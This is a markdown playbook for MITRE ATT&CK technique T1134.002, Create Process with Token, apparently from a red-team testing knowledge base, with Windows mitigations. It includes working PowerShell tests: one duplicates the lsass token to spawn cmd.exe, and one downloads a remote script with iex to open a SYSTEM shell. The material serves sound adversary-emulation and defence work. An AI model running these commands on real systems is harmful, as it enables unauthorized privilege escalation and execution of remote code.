---
name: "T1134.002_create-process-with-token"
description: "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1134.002
  - defense-evasion
  - privilege-escalation
  - windows
  - sub-technique
technique_id: "T1134.002"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - privilege-escalation
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1134/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1134
  - T1134.001
  - T1134.003
  - T1134.004
  - T1134.005
prerequisites:
  - T1134
severity_boost:
  T1134: "Chain with T1134 for deeper attack path"
  T1134.001: "Chain with T1134.001 for deeper attack path"
  T1134.003: "Chain with T1134.003 for deeper attack path"
---

# T1134.002 Create Process with Token

> **Sub-technique of:** T1134

## High-Level Description

Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.

Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.

While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Privilege Escalation (TA0004)

**Platforms:** Windows

## What to Check

- [ ] Identify if Create Process with Token technique is applicable to target environment
- [ ] Check Windows systems for indicators of Create Process with Token
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Access Token Manipulation

This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
& "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
```

### Atomic Test 2: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique

Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Create Process with Token by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1134.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management
Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object. Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.

Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.

### M1018 User Account Management
An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.


## Detection

### Behavior-chain detection for T1134.002 Create Process with Token (Windows)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Create Process with Token technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [Microsoft Command-line Logging](https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing)
- [Microsoft RunAs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))
- [Atomic Red Team - T1134.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1134.002)
- [MITRE ATT&CK - T1134.002](https://attack.mitre.org/techniques/T1134/002)
